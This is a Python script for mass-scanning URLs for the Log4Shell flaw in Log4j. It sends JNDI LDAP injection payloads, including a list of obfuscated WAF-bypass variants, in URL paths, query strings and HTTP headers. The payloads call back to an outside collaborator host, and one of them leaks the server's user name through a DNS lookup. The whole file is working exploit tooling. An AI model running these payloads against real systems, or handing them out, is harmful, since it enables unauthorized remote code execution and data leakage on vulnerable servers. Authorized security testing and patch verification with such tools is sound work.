#!/usr/bin/env python3
#! -*- coding: utf-8 -*-
import requests
import sys
import random
from loguru import logger

# Disable SSL warnings
try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except Exception:
    pass

# Requests timeout
timeout = 5

# cve_2021_45046 and cve_2021-44228 payloads
cve_payloads = [
                  "${jndi:ldap://${sys:user.name}.{{burpcollab}}/{{random}}}",
                  "${jndi:ldap://127.0.0.1#{{burpcollab}}:1389/{{random}}}",
                  "${jndi:ldap://127.0.0.1#{{burpcollab}}/{{random}}}",
                 ] 

# Bypass WAF payloads
obfuscated_payloads = [
"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}}://{{burpcollab}}/{{random}}}",
"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{burpcollab}}/{{random}}}",
"$%7Bjndi:ldap://{{burpcollab}}%7D",
"${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}{{burpcollab}}/{{random}}}",
"j${loWer:Nd}i${uPper::}",
"${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://{{burpcollab}}/{{random}}}",
"${jndi:${lower:l}${lower:d}a${lower:p}://{{burpcollab}}/{{random}}}",
"${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://{{burpcollab}}/{{random}}}",
"${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{burpcollab}}/{{random}}}",
"${${env:TEST:-j}ndi${env:TEST:-:}${env:TEST:-l}dap${env:TEST:-:}{{burpcollab}}/{{random}}}",
"${jndi:${lower:l}${lower:d}ap://{{burpcollab}}/{{random}}}",
"${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{burpcollab}}/{{random}}}",
"${jndi:ldap://127.0.0.1#{{burpcollab}}:1389/a}"]


def generate_payloads(payloads,dns_callback):
    pp = []
    for payload in payloads:
        p = payload.replace("{{burpcollab}}",dns_callback)
        p = p.replace("{{random}}",''.join(random.choice('0123456789abcdefghijklmnopqrstuvwxyz0123456789') for i in range(4)))
        pp.append(p)
    return pp


# Send First request url/<PAYLOAD>
# Send Second request url/?x=<PAYLOAD>
def exploit(payloads,url):
    logger.info(f'Test URL {url}')
    headers ={}
    for payload in payloads: 
        headers.update({"Authorization":f"Bearer {payload}"})
        headers.update({"Referer":f"{payload}"})
        headers.update({"X-Api-Version":f"{payload}"})
        headers.update({"X-Forwarded-For":f"{payload}"})
        try:
            logger.info(f"Injecting {payload}")
            requests.request(url=f'{url}/{payload}',
                                 method="GET",
                                 headers=headers,
                                 verify=False,
                                 timeout=timeout,
                                )
            requests.request(url=f'{url}/?x={payload}',
                                 method="GET",
                                 headers=headers,
                                 verify=False,
                                 timeout=timeout,
                                )       
        except Exception as e:
            logger.debug(f"{e}")



def scan(urls,burpcollab):
    for url in urls:
        exploit(generate_payloads(cve_payloads,burpcollab),url)
        exploit(generate_payloads(obfuscated_payloads,burpcollab),url)



if __name__ == '__main__':
    if not sys.stdin.isatty():
        urls = []
        for cidr in sys.stdin:
            urls.append(cidr.strip())
        scan(urls,sys.argv[1])
    else:
        print("Usage: cat urls.txt | python3 log4j.py <burp_collaborator>")
